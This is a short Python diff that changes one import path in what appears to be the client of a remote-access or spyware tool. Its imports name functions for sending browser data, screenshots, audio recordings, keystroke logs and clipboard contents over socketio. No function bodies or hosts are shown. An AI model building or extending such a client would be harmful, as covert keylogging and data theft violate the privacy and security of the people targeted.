@@ -5,7 +5,7 @@ import time
 
 import socketio
 
-from client.database_utils import send_browser_data
+from database_utils import send_browser_data
 from media_utils import take_and_send_screenshot, record_and_send_audio, record_and_send_keyboard_log, download_file, \
     start_stream as start_media_stream, stop_stream as stop_media_stream, get_clipboard_content, list_dir
 
